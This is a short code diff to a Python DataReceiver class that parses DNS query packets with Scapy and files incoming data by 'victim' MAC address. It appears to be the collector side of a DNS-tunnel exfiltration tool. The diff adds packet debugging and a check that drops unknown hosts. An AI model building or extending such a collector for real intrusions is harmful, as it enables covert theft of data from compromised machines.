@@ -29,6 +29,8 @@ class DataReceiver():
         if not pkt.haslayer(DNSQR):
             return
 
+        print(pkt.show())
+
         if pkt.getlayer(DNSQR).qtype == RequestType.PING:
             self._receive_ping(pkt)
         elif pkt.getlayer(DNSQR).qtype == RequestType.DATA:
@@ -72,6 +74,11 @@ class DataReceiver():
 
         log('DataReceiver', '_receive_data', 'Received data packet')
         victim_mac = Mac(pkt.getlayer(Ether).src)
+
+        victim_dir = self.rel_path + str(victim_mac)
+        if not os.path.exists(victim_dir):
+            log('DataReceiver', '_receive_data', 'Unknown host.')
+            return
 
         # Ignore broadcast since Ether() is sent as empty
         if str(victim_mac) == BROADCAST_MAC:
